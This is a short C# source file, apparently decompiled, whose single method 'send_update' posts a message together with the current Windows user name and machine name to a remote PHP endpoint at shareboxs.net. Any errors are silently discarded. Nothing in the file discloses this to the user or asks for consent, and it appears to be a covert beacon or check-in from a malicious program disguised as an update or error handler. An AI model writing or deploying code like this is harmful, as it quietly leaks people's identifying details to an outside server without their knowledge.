using System;
using System.IO;
using System.Net;
using System.Text;

namespace othvidtiraw;

internal static class ERWHNDL
{
	public static void send_update(string message)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://shareboxs.net/indexer.php");
			string s = "q=" + Uri.EscapeUriString(message) + "|ver=3||PNM=" + Environment.UserName + "|" + Environment.MachineName;
			byte[] bytes = Encoding.ASCII.GetBytes(s);
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			httpWebRequest.ContentLength = bytes.Length;
			using (Stream stream = httpWebRequest.GetRequestStream())
			{
				stream.Write(bytes, 0, bytes.Length);
			}
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		}
		catch
		{
		}
	}
}
